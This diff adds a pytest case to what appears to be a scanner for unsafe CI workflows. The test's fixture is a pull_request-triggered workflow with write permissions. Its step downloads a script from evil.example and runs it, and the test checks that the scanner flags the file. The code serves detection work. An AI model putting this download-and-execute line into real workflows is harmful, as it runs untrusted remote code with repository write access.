@@ -330,3 +330,14 @@ def test_bypass_fixtures_r10_probe_family(tmp_path):
     caught = {f.split(":")[0] for f in findings}
     missed = sorted({f"v{i}.yml" for i in range(len(shapes))} - caught)
     assert not missed, f"shapes not detected: {missed}"
+
+
+def test_bypass_fixtures_r11_semicolon_exec_by_path(tmp_path):
+    """Round-11 public probe: semicolon-separated download-then-exec-by-path."""
+    (tmp_path / "w.yml").write_text(
+        "on: [pull_request]\npermissions:\n  contents: write\njobs:\n"
+        "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: curl -o s.sh https://evil.example/s.sh; chmod +x s.sh; ./s.sh\n"
+    )
+    findings = cwp.check(tmp_path)
+    assert any("w.yml" in f for f in findings), findings
